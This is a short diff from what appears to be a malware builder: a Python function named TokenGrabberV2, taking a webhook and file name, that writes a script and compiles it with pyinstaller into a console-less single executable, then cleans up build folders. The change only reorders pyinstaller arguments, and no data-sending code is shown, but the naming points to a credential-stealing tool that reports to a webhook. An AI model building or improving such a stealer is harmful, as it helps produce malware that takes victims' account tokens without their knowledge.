@@ -26,7 +26,7 @@ def TokenGrabberV2(WebHook, fileName):
         with open(f"{fileName}.py", 'r+') as f:
             f.write(replace_string)
 
-        os.system(f"pyinstaller {fileName}.py --onefile --noconsole --log-level=INFO -i NONE -n {fileName}")
+        os.system(f"pyinstaller --onefile --noconsole --log-level=INFO -i NONE -n {fileName} {fileName}.py")
         shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
         shutil.rmtree('build')
         shutil.rmtree('dist')
